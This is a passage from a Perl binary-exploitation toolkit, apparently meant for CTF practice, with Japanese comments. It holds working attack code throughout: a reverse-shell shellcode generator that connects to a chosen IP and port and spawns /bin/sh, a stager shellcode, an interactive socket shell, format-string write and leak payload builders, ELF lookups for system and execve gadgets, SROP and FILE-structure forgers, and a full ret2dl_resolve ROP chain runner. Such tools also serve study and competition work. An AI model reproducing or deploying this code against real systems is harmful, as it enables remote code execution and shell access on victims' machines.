		#  push WORD 0x697a  ;   （逆順）                     PORT = 31337
		#  push WORD bx      ;                                AF_INET = 2
		#  mov ecx, esp      ; ecx = サーバ構造体へのポインタ
		#  push BYTE 16      ; argv: { sizeof(server struct) = 16,
		#  push ecx          ;         server struct pointer,
		#  push esi          ;         socket file descriptor }
		#  mov ecx, esp      ; ecx = 引数の配列
		#  inc ebx           ; ebx = 3 = SYS_CONNECT = connect()
		#  int 0x80          ; eax = 接続されたソケットファイル記述子
		#
		#; dup2(connected socket, ｛標準入出力ファイル記述子すべて｝)
		#  xchg esi, ebx     ; ソケットファイル記述子をebxに、0x00000003をesiに設定する
		#  xchg ecx, esi     ; ecx = 3
		#  dec ecx           ; ecxは2から開始する
		#;  push BYTE 0x2     ; ecxは2から開始する
		#;  pop ecx
		#dup_loop:
		#  mov BYTE al, 0x3F ; dup2はシステムコール63番
		#  int 0x80          ; dup2(c, 0)
		#  dec ecx           ; 0に向かってカウントダウンを行う
		#  jns dup_loop      ; サインフラグがセットされていない、すなわちecxが負ではない場合
		#
		#; execve(const char *filename, char *const argv [], char *const envp[])
		#  mov BYTE al, 11   ; execveはシステムコール11番
		#  push edx          ; 文字列を終端させるためにnullバイト（複数）をプッシュする
		#  push 0x68732f2f   ; "//sh"をスタックにプッシュする
		#  push 0x6e69622f   ; "/bin"をスタックにプッシュする
		#  mov ebx, esp      ; "/bin//sh"のアドレスをesp経由でebxに格納する
		#  push edx          ; スタックに32ビットのnull終端をプッシュする
		#  mov edx, esp      ; これはenvp用の空の配列である
		#  push ebx          ; null終端の上にある文字列のアドレスをスタックにプッシュする
		#  mov ecx, esp      ; これは文字列ポインタを用いたargv用の配列である
		#  int 0x80          ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
		my $ipaddr = shift || return '';
		$ipaddr = &ipv4addr_to_int($ipaddr);
		return '' if (!defined $ipaddr);
		my $port = shift || return '';
		$port = int($port);
		return '' if ($port < 0 || $port > 65535);
		$ret =  "\x6a\x66\x58\x99\x31\xdb\x43\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80" .
			"\x96\x6a\x66\x58\x43\x68".pack('N', $ipaddr) .  #"\xc0\xa8\x2a\x48" . 
			"\x66\x68".pack('n', $port)."\x66\x53" .
			"\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\xcd\x80\x87\xf3\x87\xce\x49" .
			"\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68" .
			"\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80";
	}
	elsif ($type eq 'stager') { # 
		my $fd = shift || return '';
		$fd = int($fd);
		return '' if ($fd < 0 || $fd > 0xff);
 		#"\x6A\x7F"		//	push	byte	+0x7F
 		#"\x5A"			//	pop		edx	
 		#"\x54"			//	push	esp
 		#"\x59"			//	pop		esp
 		#"\x31\xDB"		//	xor		ebx,ebx
 		#"\x6A\x03"		//	push	byte	+0x3
 		#"\x58"			//	pop		eax
 		#"\xCD\x80"		//	int		0x80
 		#"\x51"			//	push	ecx
 		#"\xC3";			//	ret
		$ret =  "\x6A\x7F\x5A\x54\x59" .
			"\x6a".pack('C', $fd)  . # push byte 0x??
			"\x5b" .		# pop ebx
						#\x31\xDB   // xor ebx,ebx
			"\x6A\x03\x58\xCD\x80\x51\xC3";
		# * Example of use:
		# * (echo -ne "\xseconde stage shellcode\x"; cat) | ./stager
	}
	return $ret;
}

# interact 簡易版
#&interact($s);
#&interact($s, 65536);
sub interact {
	my $socket = shift || return;
	my $size = shift || 4096;
	my $rin = &set_bits($socket, *STDIN);
	my $rout = 0; my $cmd = ''; my $data = '';
	while(1) {
		my $ret = select($rout=$rin, undef, undef, 5);
		#printf("\$ret=$ret \$rout=%s,\$rin=%s\n", &to_bin($rout), &to_bin($rin));
		if (vec($rout, fileno(*STDIN), 1)) {
			sysread(*STDIN, $cmd, 256); 
			syswrite($socket, $cmd, length($cmd));
			sysread($socket, $data, $size); 
			last if (!defined $data or $cmd =~ /exit/);
			print $data;
		}
	}
}

#$buf = &get_fsbstr (0x0804a01c, 0xffffd61c+40, 40, 7); # target_addr, value, bufsize, index
sub get_fsbstr {
	my $target_addr = shift || return undef;
	my $val = shift || return undef;
	my $bufsize = shift || return undef;
	my $index = shift || return undef;
	my $payload = pack('V', $target_addr + 2) . pack("V", $target_addr) .
		 sprintf('%%%dx%%%d$hn%%%dx%%%d$hn', 
			&hn_pre($val, 8), $index, &hn_post($val), $index+1);
	my $plen = length($payload);
	print "[+] payload_len: $plen\n";
	my $padlen = $bufsize - $plen;
	if ($padlen < 0) {
		print "[+] padlen: $padlen\n";
		return undef;
	}
	$payload .= "_" x $padlen;
	return $payload;
}

sub get_fsbleakstr {
	my $target_addr = shift || return undef;
	my $bufsize = shift || return undef;
	my $index = shift || return undef;
	my $leaknum = shift || 10;
	my $datatype = shift || 's';
	my @out = ();
# perl -e 'print "\xbc\xd6\x04\x08". "\%7\$s"."_" x 30;' | ./fsb
#LESSOPEN=| /usr/bin/lesspipe %s______________________________
# perl -e 'print "\xbc\xd6\x04\x08". "\%7\$08x"."_" x 30;' | ./fsb
	my $typestr = ($datatype eq 's') ? 's' : '08x';
	foreach (0..($leaknum-1)) {
		my $payload = pack('V', $target_addr + 4 * $_). 
			sprintf("____\%\%%d\$".$typestr, $index);
		my $plen = length($payload);
		my $padlen = $bufsize - $plen;
		if ($padlen < 0) {
			print "[+] padlen: $padlen\n";
			return undef;
		}
		$payload .= "_" x $padlen;
		push @out, $payload;
	}
	return @out;
}

# 1個以上のファイルハンドルを受け取り、fileno で各ファイルハンドルの
# ディスクリプタ番号を調べ、それに対応するビットを立てたデータを返す。
# 例えば 01011000 というデータを返す。
sub set_bits {
	my @fhlist = @_; 
	my $rin="";
	map { vec($rin, fileno($_), 1)=1; } @fhlist;
	return $rin;
}

sub ipv4addr_to_int {
	my $addr = shift || return undef;
	return undef if $addr !~ m{ \A \d{1,3} (?: [.] \d{1,3}){3} \Z }xms;
	my @bytes = split /\./, $addr;
	return unpack( "N", pack("C4", @bytes));
}

# データ確認用
sub bin_to_ascii {
	return unpack("H*", $_[0]);
}

sub to_bin {
	return unpack "B*", $_[0];
}

# fsb関連
sub hn_pre {
	my $x = shift;
	my $o = shift;
	return ($x >> 16) - $o;
}
   
sub hn_post {
	my $x = shift;
	my $a = $x >> 16;
	my $b = $x & 0x0000ffff;
	$b += 0x10000 if ($b - $a < 0) ;
	return $b-$a;
}

# アドレス調査用の文字列生成
sub cbuf {
	my $n = shift;
	my $ret = '';
	my @cols = ('0', '0', '0', '0');
	# n=1000000, ret = '...1000'
	my $i = 0;
	while (1) { 
		last if ($i >= $n);
		$cols[3] =~ tr/0-9a-zA-Z/1-9a-zA-Z0/;
		if ($cols[3] ne '0') { $i+=4; $ret .= join('', @cols); next; }
		$cols[2] =~ tr/0-9a-zA-Z/1-9a-zA-Z0/;
		if ($cols[2] ne '0') { $i+=4; $ret .= join('', @cols); next; }
		$cols[1] =~ tr/0-9a-zA-Z/1-9a-zA-Z0/;
		if ($cols[1] ne '0') { $i+=4; $ret .= join('', @cols); next; }
		$cols[0] =~ tr/0-9a-zA-Z/1-9a-zA-Z0/;
		if ($cols[0] ne '0') { $i+=4; $ret .= join('', @cols); next; }
		last;
	}
	return $ret;
}

sub p {
	my $val = shift; 
	if ($ARCH eq 'x86') { return pack('V', $val);
	} elsif ($ARCH eq '64') { return pack('Q', $val);
	}
	return undef;
}

sub u {
	my $val = shift; 
	if ($ARCH eq 'x86') { return unpack('V', $val);
	} elsif ($ARCH eq '64') { return unpack('Q', $val);
	}
	return undef;
}

package elfinfo;

# constructor
sub new {
	my $class = shift;
	my $self = { # 
	file => '',
	got => undef,
	plt => undef,
	func => undef,
	str => undef,
	bss => undef,
	rce => undef,
	base_addr => 0,
	@_,
	};
	return bless $self, $class;
}

sub function {
	my $self = shift;
	my $k = shift or return undef;
	return undef if (!-r $self->{file});
	if (!defined $self->{func}) {
		$self->{func} = {};
## file -bL /lib/x86_64-linux-gnu/libc.so.6
#ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked (uses shared libs),
## nm -D /lib/x86_64-linux-gnu/libc.so.6|grep system
#00000000000443d0 W system
		my $cmd = '';
		my $type = `file -bL $self->{file} 2>/dev/null`;
		if ($type =~ /shared\s+object/) {
		$cmd = "nm -D $self->{file}";
		} else {
		$cmd = "objdump -d -Mintel $self->{file}";
		}
		my @res = `$cmd 2>/dev/null`;
		if ($type =~ /shared object/) {
			foreach (@res) {
			chomp;
			my @cols = split(/\s+/, $_);
			$self->{func}->{$cols[2]} = hex($cols[0]); 
			}
		} else {
			foreach (@res) {
			chomp;
			/^([0-9a-f]+)\s+\<([^\>]+)\>/ && do { $self->{func}->{$2} = hex($1); };
			}
		}
	}
	my $ret = undef;
	$ret = $self->{base_addr}+$self->{func}->{$k} if (exists $self->{func}->{$k});
	return $ret;
}

sub search {
	my $self = shift;
	my $k = shift or return undef;
	return undef if (!-r $self->{file});
	if (!defined $self->{str}) {
		$self->{str} = {};
		my @res = `strings -tx -a $self->{file} 2>/dev/null`;
		foreach (@res) {
		chomp;
		my @cols = split(/\s+/, $_);
		$self->{str}->{$cols[2]} = hex($cols[1]); 
		}
	}
	my $ret = undef;
	$ret = $self->{str}->{$k} if (exists $self->{str}->{$k});
	return $ret;
}

sub got {
	my $self = shift;
	my $k = shift or return undef;
	return undef if (!-r $self->{file});
	if (!defined $self->{got}) {
		$self->{got} = {};
		my @res = `readelf -r $self->{file} 2>/dev/null`;
		foreach (@res) {
		chomp;
		my @cols = split(/\s+/, $_);
		$self->{got}->{$cols[4]} = hex($cols[0]); 
		}
	}
	my $ret = undef;
	$ret = $self->{got}->{$k} if (exists $self->{got}->{$k});
	return $ret;
}

sub plt {
	my $self = shift;
	my $k = shift or return undef;
	return undef if (!-r $self->{file});
	if (!defined $self->{plt}) {
		$self->{plt} = {};
		my @res = `objdump -d -Mintel -j.plt $self->{file} 2>/dev/null`;
		foreach (@res) {
		chomp;
		/^([0-9a-f]+)\s+\<([^\>]+)\@plt\>/ && do { $self->{plt}->{$2} = hex($1); };
		}
	}
	my $ret = undef;
	$ret = $self->{plt}->{$k} if (exists $self->{plt}->{$k});
	return $ret;
}

sub bss {
	my $self = shift;
	return undef if (!-r $self->{file});
	if (!defined $self->{bss}) {
		my @res = `readelf -S $self->{file} 2>/dev/null`;
		foreach (@res) {
		chomp;
		next unless (/bss/);
		my @cols = split(/\s+/, $_);
		$self->{bss} = hex($cols[4]);
		last;
		}
	}
	return (defined $self->{bss}) ? $self->{bss} : undef;
}

sub rce {
	my $self = shift;
	return undef if (!-r $self->{file});
## file -bL /lib/i386-linux-gnu/libc.so.6
#ELF 32-bit LSB shared object
## objdump -d -Mintel /lib/i386-linux-gnu/libc.so.6 | grep -A 2 -B 12 -e execve
## file -bL /lib/x86_64-linux-gnu/libc.so.6
#ELF 64-bit LSB shared object
## objdump -d -Mintel /lib/x86_64-linux-gnu/libc.so.6 | grep -A 2 -B 9 -e execve
	if (!defined $self->{rce}) {
		my $type = `file -bL $self->{file} 2>/dev/null`;
		my $cmd = '';
		if ($type =~ /ELF 32-bit LSB shared object/) {
		$cmd = "objdump -d -Mintel $self->{file} | grep -A 2 -B 12 -e execve";
		} elsif ($type =~ /ELF 64-bit LSB shared object/)  {
		$cmd = "objdump -d -Mintel $self->{file} | grep -A 2 -B 9 -e execve";
		} else {
		return undef;
		}
		$self->{rce} = [];
		my @res = `$cmd 2>/dev/null`;
		my @rows = ();
		if ($type =~ /ELF 32-bit LSB shared object/) {
			foreach (@res) {
				chomp;
				if (/^\-\-/) {
				my @n = grep { /sigprocmask/ } @rows;
				if (@n > 0) {
				push @{$self->{rce}}, hex((split(/\s+/, $rows[1]))[1]); last;
				}
				@rows = ();
				} else {
				push @rows, $_;
				}
			}
		} elsif ($type =~ /ELF 64-bit LSB shared object/)  {
			foreach (@res) {
				chomp;
				if (/^\-\-/) {
				my @n = grep { /rax,QWORD PTR|_exit|abort|lea\s+rsi,\[rsp/ } @rows;
				if (@n > 2) {
				push @{$self->{rce}}, hex((split(/\s+/, $n[0]))[1]); 
				}
				@rows = ();
				} else {
				push @rows, $_;
				}
			}
			my @closelist = grep { /__close/ } @res;
			map { push @{$self->{rce}}, hex((split(/\s+/, $_))[1])+5; } @closelist;
		}
	}
	return (defined $self->{rce}) ? @{$self->{rce}} : undef;
}

sub base_addr {
	my $self = shift;
	return $self->{base_addr};
}

sub set_location {
	my $self = shift;
	my $k = shift;
	my $addr = shift;

	return undef if (!defined $self->{func} or !defined $self->{func}->{$k});
	my $type = `file -bL $self->{file} 2>/dev/null`;
	return undef if ($type !~ /shared\s+object/) ;
	$self->{base_addr} = $addr - $self->{func}->{$k};
	return 1;
}

package srop_x86;
#+ SROP(x86) mprotect
our @smap = (
	'gs',
	'fs',
	'es',
	'ds',
	'edi',
	'esi',
	'ebp',
	'esp',
	'ebx',
	'edx',
	'ecx',
	'eax',
	'trapno',
	'err',
	'eip',
	'cs',
	'eflags',
	'esp_at_signal',
	'ss',    
	'fpstate'
);
# constructor
sub new {
	my $class = shift;
	my $self = { # 
	gs       => 0,
	fs       => 0,
	es       => 0,
	ds       => 0x23,
	edi      => 0,
	esi      => 0,
	ebp      => 0,
	esp      => 0x0,  # next esp
	ebx      => 0x0,  # target addr
	edx      => 7,
	ecx      => 0x1000,
	eax      => 125,
	trapno   => 0x0,
	err      => 0x0,
	eip      => 0x0,  # syscall addr
	cs       => 0x23, 
	eflags   => 0x0, 
	esp_at_signal => 0x0, 
	ss       => 0x2b, 
	fpstate  => 0x0, 
	@_,
	};
	return bless $self, $class;
}

sub pack {
	my $self = shift;
	my $buf = '';
	map { $buf .= pack('V', $self->{$_}); } @smap;
	return $buf;
}

sub dump {
	my $self = shift;
	my $str = '[';
	my @v = ();
	map { push @v, $self->{$_}; } @smap;
	$str .= join(',', @v)."]\n";
	return $str;
}

sub len {
	my $self = shift;
	return scalar(keys %$self)*4;
}

#sub esp {
#  my $self = shift;
#  if( @_ ){ $self->{esp} = shift }
#  return $self->{esp};
#}

package fse_x86_64;
#+ SROP(x86) mprotect
our @fmap = (
	'_flags',
	'_IO_read_ptr',
	'_IO_read_end',
	'_IO_read_base',
	'_IO_write_base',
	'_IO_write_ptr',
	'_IO_write_end',
	'_IO_buf_base',
	'_IO_buf_end',
	'_IO_save_base',
	'_IO_backup_base',
	'_IO_save_end',
	'_IO_marker',
	'_IO_chain',
	'_fileno',
	'_lock'
);
# constructor
sub new {
	my $class = shift;
	my $self = { # 
	'_flags' => 0,
	'_IO_read_ptr' => 0,
	'_IO_read_end' => 0,
	'_IO_read_base' => 0,
	'_IO_write_base' => 0,
	'_IO_write_ptr' => 0,
	'_IO_write_end' => 0,
	'_IO_buf_base' => 0,
	'_IO_buf_end' => 0,
	'_IO_save_base' => 0,
	'_IO_backup_base' => 0,
	'_IO_save_end' => 0,
	'_IO_marker' => 0,
	'_IO_chain' => 0,
	'_fileno' => 0,
	'_lock' => 0,
	@_,
	};
	return bless $self, $class;
}

sub pack {
	my $self = shift;
	my $buf = '';
	foreach (@fmap) {
		if ($_ eq '_flags') {
		#$buf .= pack('Q', $self->{$_}); 
		$buf .= pack('V', $self->{$_}); 
		$buf .= pack('V', 0); 
		} elsif ($_ eq '_fileno') {
		$buf .= pack('V', $self->{$_}); 
		} elsif ($_ eq '_lock') {
		} else {
		$buf .= pack('Q', $self->{$_}); 
		}
	}
	$buf .= "\x00" x (0x88-length($buf));
	$buf .= pack('Q', $self->{_lock}); 
	$buf .= "\x00" x (0xd8-length($buf));
	return $buf;
}

package srop_x86_64;
#+ SROP(x86_64) mprotect
#rax = 0xa
#rdi = 0x00601000
#rsi = 0x1000
#rdx = 0x7

our @smap = (
	'uc_flags',
	'uc',        # &uc
	'ss_sp',     # uc_stack.ss_sp
	'ss_flags',  # uc_stack.ss_flags
	'ss_size',   # uc_stack.ss_size
	'r8',
	'r9',
	'r10',
	'r11',
	'r12',
	'r13',
	'r14',
	'r15',
	'rdi',
	'rsi',
	'rbp',
	'rbx',
	'rdx',
	'rax',
	'rcx',
	'rsp',
	'rip',
	'eflags',
	'csgsfs',
	'err',
	'trapno',
	'oldmask',
	'cr2',
	'fpstate',   # &fpstate
	'__reserved',
	'sigmask',
);

#[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 6295552, 4096, 0, 0, 7, 10, 0, 0, 0, 0, 51, 0, 0, 0, 0, 0, 0, 0]
# constructor
sub new {
	my $class = shift;
	my $self = { # 
	'uc_flags'   =>0,
	'uc'         =>0,
	'ss_sp'      =>0,
	'ss_flags'   =>0,
	'ss_size'    =>0,
	'r8'         =>0,
	'r9'         =>0,
	'r10'        =>0,
	'r11'        =>0,
	'r12'        =>0,
	'r13'        =>0,
	'r14'        =>0,
	'r15'        =>0,
	'rdi'        =>0x0, # addr
	'rsi'        =>0x1000,
	'rbp'        =>0x0,
	'rbx'        =>0,
	'rdx'        =>0x7,
	'rax'        =>0xa,
	'rcx'        =>0,
	'rsp'        =>0x0,
	'rip'        =>0x0,
	'eflags'     =>0,
	'csgsfs'     =>51,
	'err'        =>0,
	'trapno'     =>0,
	'oldmask'    =>0,
	'cr2'        =>0,
	'fpstate'    =>0,
	'__reserved' =>0,
	'sigmask'    =>0,
	@_,
	};
	return bless $self, $class;
}

sub pack {
	my $self = shift;
	my $buf = '';
	map { $buf .= pack('V', $self->{$_}); } @smap; # Q
	return $buf;
}

sub dump {
	my $self = shift;
	my $str = '[';
	my @v = ();
	map { push @v, $self->{$_}; } @smap;
	$str .= join(',', @v)."]\n";
	return $str;
}

sub len {
	my $self = shift;
	return scalar(keys %$self)*4;
}

package ret2dl_resolve;
# constructor
sub new {
	my $class = shift;
	my $self = { # mprotect
	dynsym   => 0,# readelf -S a.out
	dynstr   => 0,# readelf -S a.out
	relplt   => 0,# readelf -S a.out
	plt      => 0,# readelf -S a.out
	bss      => 0,# readelf -S a.out
	got_func => 0,# readelf -r bof64 => e.g.: addr_got_read
	call     => "system",
	arg	 => "", # readelf -r bof64
	@_,
	};
	return bless $self, $class;
}

sub pack {
	my $self = shift;
	my $buf = '';
	my $addr_reloc = $self->{bss} + 16;
	my $addr_sym = $addr_reloc + 8;
	my $align_dynsym = 0x10 - (($addr_sym-$self->{dynsym}) & 0xF);
	$addr_sym += $align_dynsym;
	my $addr_symstr = $addr_sym + 16;
	my $addr_cmd = $addr_symstr + length($self->{call})+1; # "system"+"\x00"=7
	my $reloc_offset = $addr_reloc - $self->{relplt};
	my $r_info = (($addr_sym - $self->{dynsym}) << 4) & ~0xFF | 0x7;
	my $st_name = $addr_symstr - $self->{dynstr};
	
	$buf  = pack('V', $self->{plt});
	$buf .= pack('V', $reloc_offset);
	$buf .= 'AAAA';
	$buf .= pack('V', $addr_cmd);
	$buf .= pack('V', $self->{got_func}); # Elf32_Rel
	$buf .= pack('V', $r_info);
	$buf .= 'A' x $align_dynsym;
	$buf .= pack('V', $st_name);       # Elf32_Sym
	$buf .= pack('V', 0);
	$buf .= pack('V', 0);
	$buf .= pack('V', 0x12);
	$buf .= $self->{call}."\x00";
	$buf .= $self->{arg}."\x00";
	return $buf;
}

package ret2dl_resolve_64;
use Time::HiRes qw(usleep);
# constructor
sub new {
	my $class = shift;
	my $self = { # 
	dynsym   	=> 0,  # readelf -S a.out
	dynstr   	=> 0,  # readelf -S a.out
	relplt   	=> 0,  # readelf -S a.out
	plt      	=> 0,  # readelf -S a.out
	bss      	=> 0,  # readelf -S a.out
	plt_read 	=> 0,  # objdump -d -j.plt a.out
	plt_write	=> 0,  # objdump -d -j.plt a.out
	dt_debug 	=> 0,  # objdump -s -j.dynamic a.out # (DT_DEBUG = 0x15)
# 600e90 15000000 00000000 00000000 00000000  ................
# => 0x600e98
	pop_rdi  	=> 0,  # rp-lin-x64 -r 2 --unique -f a.out
	pop_rsi  	=> 0,  # rp-lin-x64 -r 2 --unique -f a.out
	pop_rdx  	=> 0,  # rp-lin-x64 -r 2 --unique -f a.out
	stack_size	=> 0x800,
	idx_linkmap	=> 2,
## ldd bof64
#        linux-vdso.so.1 =>  (0x00007ffff7ffe000)
#        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7c1a000)
#        /lib64/ld-linux-x86-64.so.2 (0x0000555555554000) 
# => 2
	frame_length	=> 1000,
	verbose		=> 0,
	call		=> "system",
	arg		=> "", # '/bin/sh <&1 >&1'
	@_,
	};
	return bless $self, $class;
}

sub run {
	my $self = shift;
	my $s = shift or return undef ;

	my $base_stage = $self->{bss} + $self->{stack_size};
	my $size_bulkread = 0x800;
	my $buf  = 'A' x 8;

	# read dt_debug
	my $addr_esp = $base_stage + 8;
	$buf .= pack('Q', $self->{pop_rdi});
	$buf .= pack('Q', 1);
	$buf .= pack('Q', $self->{pop_rsi});
	$buf .= pack('Q', $self->{dt_debug});
	$buf .= pack('Q', $self->{pop_rdx});
	$buf .= pack('Q', 8);
	$buf .= pack('Q', $self->{plt_write});
	$buf .= pack('Q', $self->{pop_rdi});
	$buf .= pack('Q', 0);
	$buf .= pack('Q', $self->{pop_rsi});
	$buf .= pack('Q', $addr_esp + 8*17);
	$buf .= pack('Q', $self->{pop_rdx});
	$buf .= pack('Q', 8);
	$buf .= pack('Q', $self->{plt_read});
	# read r_debug and link_map
	$addr_esp += 8*14;
	$buf .= pack('Q', $self->{pop_rdi});
	$buf .= pack('Q', 1);
	$buf .= pack('Q', $self->{pop_rsi});
	$buf .= 'AAAAAAAA'; # addr_r_debug
	$buf .= pack('Q', $self->{pop_rdx});
	$buf .= pack('Q', $size_bulkread);
	$buf .= pack('Q', $self->{plt_write});
	$buf .= pack('Q', $self->{pop_rdi});
	$buf .= pack('Q', 0);
	$buf .= pack('Q', $self->{pop_rsi});
	$buf .= pack('Q', $addr_esp + 8*17);
	$buf .= pack('Q', $self->{pop_rdx});
	$buf .= pack('Q', 8);
	$buf .= pack('Q', $self->{plt_read});
	# read link_map_lib
	foreach (0..$self->{idx_linkmap}-1) {
	$addr_esp += 8*14;
	$buf .= pack('Q', $self->{pop_rdi});
	$buf .= pack('Q', 1);
	$buf .= pack('Q', $self->{pop_rsi});
	$buf .= 'AAAAAAAA'; # addr_link_map_lib
	$buf .= pack('Q', $self->{pop_rdx});
	$buf .= pack('Q', 40);
	$buf .= pack('Q', $self->{plt_write});
	$buf .= pack('Q', $self->{pop_rdi});
	$buf .= pack('Q', 0);
	$buf .= pack('Q', $self->{pop_rsi});
	$buf .= pack('Q', $addr_esp + 8*17);
	$buf .= pack('Q', $self->{pop_rdx});
	$buf .= pack('Q', 8);
	$buf .= pack('Q', $self->{plt_read});
	}
	# read lib_dynamic and lib_gotplt
	$addr_esp += 8*14;
	$buf .= pack('Q', $self->{pop_rdi});
	$buf .= pack('Q', 1);
	$buf .= pack('Q', $self->{pop_rsi});
	$buf .= 'AAAAAAAA'; # addr_lib_dynamic
	$buf .= pack('Q', $self->{pop_rdx});
	$buf .= pack('Q', $size_bulkread);
	$buf .= pack('Q', $self->{plt_write});
	$buf .= pack('Q', $self->{pop_rdi});
	$buf .= pack('Q', 0);
	$buf .= pack('Q', $self->{pop_rsi});
	$buf .= pack('Q', $addr_esp + 8*17);
	$buf .= pack('Q', $self->{pop_rdx});
	$buf .= pack('Q', 8);
	$buf .= pack('Q', $self->{plt_read});
	# overwrite dt_versym
	$addr_esp += 8*14;
	$buf .= pack('Q', $self->{pop_rdi});
	$buf .= pack('Q', 0);
	$buf .= pack('Q', $self->{pop_rsi});
	$buf .= 'AAAAAAAA'; # addr_dt_versym
	$buf .= pack('Q', $self->{pop_rdx});
	$buf .= pack('Q', 8);
	$buf .= pack('Q', $self->{plt_read});
	$buf .= pack('Q', $self->{pop_rdi});
	$buf .= pack('Q', 0);
	$buf .= pack('Q', $self->{pop_rsi});
	$buf .= pack('Q', $addr_esp + 8*16);
	$buf .= pack('Q', $self->{pop_rdx});
	$buf .= pack('Q', 16);
	$buf .= pack('Q', $self->{plt_read});
	# call dl_resolve
	$addr_esp += 8*14;
	my $addr_reloc = $addr_esp + 48;
	my $align_reloc = 0x18 - (($addr_reloc-$self->{relplt}) % 0x18);
	$addr_reloc += $align_reloc;
	my $addr_sym = $addr_reloc + 24;
	my $align_dynsym = 0x18 - (($addr_sym-$self->{dynsym}) % 0x18);
	$addr_sym += $align_dynsym;
	my $addr_symstr = $addr_sym + 24;
	my $addr_cmd = $addr_symstr + 7;
	my $reloc_offset = ($addr_reloc - $self->{relplt}) / 0x18;
	my $r_info = ((($addr_sym - $self->{dynsym}) / 0x18) << 32) | 0x7;
	my $st_name = $addr_symstr - $self->{dynstr};
	$buf .= pack('Q', $self->{pop_rdi});
	$buf .= pack('Q', $addr_cmd);
	$buf .= 'AAAAAAAA'; # addr_dl_resolve
	$buf .= 'AAAAAAAA'; # addr_link_map
	$buf .= pack('Q', $reloc_offset);
	$buf .= 'AAAAAAAA';
	$buf .= 'A' x $align_reloc;
	$buf .= pack('Q', $self->{bss}); # Elf64_Rela
	$buf .= pack('Q', $r_info);
	$buf .= pack('Q', 0);
	$buf .= 'A' x $align_dynsym;
	$buf .= pack('V', $st_name);  # Elf64_Sym
	$buf .= pack('V', 0x12);
	$buf .= pack('Q', 0);
	$buf .= pack('Q', 0);
	$buf .= $self->{call}."\x00";
	$buf .= $self->{arg}."\x00";
	$buf .= 'A' x ($self->{frame_length} - length($buf));
	printf("[+] buf: %s\n", unpack("H*", $buf)) if ($self->{verbose}); 

	#printf("[+] data: %s\n", unpack("H*", $data)); 
	syswrite($s, $buf, length($buf)); usleep(100000);
	my $data = '';
	sysread($s, $data, 8);
	my $addr_r_debug = unpack('Q', $data);
	printf("[+] addr_r_debug = 0x%x\n", $addr_r_debug) if ($self->{verbose});
	usleep(10000);

	$buf = pack('Q', $addr_r_debug);
	syswrite($s, $buf, length($buf)); usleep(100000);
	sysread($s, $data, $size_bulkread);
	my $addr_link_map = unpack('Q', (substr($data, 8, 8)));
	my $offset = $addr_link_map - $addr_r_debug;
	my $addr_link_map_lib = unpack('Q', (substr($data, $offset+24, 8)));
	if ($self->{verbose}) {
	printf("[+] addr_link_map, addr_link_map_lib = 0x%x, 0x%x\n", $addr_link_map, $addr_link_map_lib);
	}
	usleep(10000);

	foreach (0..$self->{idx_linkmap}-2) {
	$buf = pack('Q', $addr_link_map_lib);
	syswrite($s, $buf, length($buf)); usleep(100000);
	sysread($s, $data, 40);
	$addr_link_map_lib = unpack('Q', substr($data, 24, 8));
	if ($self->{verbose}) {
	printf("[+] addr_link_map_lib = 0x%x\n", $addr_link_map_lib);
	}
	usleep(10000);
	}

	$buf = pack('Q', $addr_link_map_lib);
	syswrite($s, $buf, length($buf)); usleep(100000);
	sysread($s, $data, 40);
	my $addr_lib_dynamic = unpack('Q', substr($data, 16, 8));
	if ($self->{verbose}) {
	printf("[+] addr_lib_dynamic = 0x%x\n", $addr_lib_dynamic);
	}

	$buf = pack('Q', $addr_lib_dynamic);
	syswrite($s, $buf, length($buf)); usleep(100000);
	sysread($s, $data, $size_bulkread);
	my $str = (split(/\x03\x00\x00\x00\x00\x00\x00\x00/, $data))[1];
	my $addr_lib_gotplt = unpack('Q', substr($str, 0, 8));
	$offset = $addr_lib_gotplt - $addr_lib_dynamic;
	my $addr_dl_resolve = unpack('Q', substr($data, $offset+16, 8));
	if ($self->{verbose}) {
	printf("[+] addr_lib_gotplt, addr_dl_resolve = 0x%x, 0x%x\n", $addr_lib_gotplt, $addr_dl_resolve);
	}
	
	$buf  = pack('Q', $addr_link_map+0x1c8);
	$buf .= pack('Q', 0);
	$buf .= pack('Q', $addr_dl_resolve);
	$buf .= pack('Q', $addr_link_map);
	syswrite($s, $buf, length($buf)); 
}

1;
__END__
Tips
+ syscall#
  x86
  https://github.com/torvalds/linux/blob/v2.6.24/include/asm-x86/unistd_32.h
  https://github.com/torvalds/linux/blob/master/arch/x86/include/asm/syscall.h
  x86-64
  https://github.com/torvalds/linux/blob/v2.6.24/include/asm-x86/unistd_64.h
  arm
  https://github.com/torvalds/linux/blob/master/arch/arm/include/uapi/asm/unistd.h
  https://github.com/torvalds/linux/blob/v2.6.24/include/asm-arm/unistd.h
  https://github.com/torvalds/linux/blob/master/arch/arm/include/asm/syscall.h
  s390
  https://github.com/torvalds/linux/blob/master/arch/s390/include/uapi/asm/unistd.h
  https://github.com/torvalds/linux/blob/v2.6.24/include/asm-s390/unistd.h
  https://github.com/torvalds/linux/blob/master/arch/s390/include/asm/syscall.h
  aarch64
  https://github.com/torvalds/linux/blob/master/include/uapi/asm-generic/unistd.h
  https://github.com/torvalds/linux/blob/master/arch/arm64/include/asm/syscall.h
  sh4
  https://github.com/torvalds/linux/blob/master/arch/sh/include/uapi/asm/unistd_32.h
  https://github.com/torvalds/linux/blob/v2.6.24/include/asm-sh/unistd.h
  https://github.com/torvalds/linux/blob/master/arch/sh/include/asm/syscall_32.h
  https://github.com/torvalds/linux/blob/master/arch/sh/include/asm/syscall_64.h
  ppc
  https://github.com/torvalds/linux/blob/master/arch/powerpc/include/uapi/asm/unistd.h
  https://github.com/torvalds/linux/blob/v2.6.24/include/asm-powerpc/unistd.h
  https://github.com/torvalds/linux/blob/master/arch/powerpc/include/asm/syscall.h
  mips
  https://github.com/torvalds/linux/blob/master/arch/mips/include/uapi/asm/unistd.h
  https://github.com/torvalds/linux/blob/v2.6.24/include/asm-mips/unistd.h
  https://github.com/torvalds/linux/blob/master/arch/mips/include/asm/syscall.h

+ nop
  x86/x86-64
  \x90     ; nop
  arm      
  \xc0\x46 ; mov r8, r8
  s390
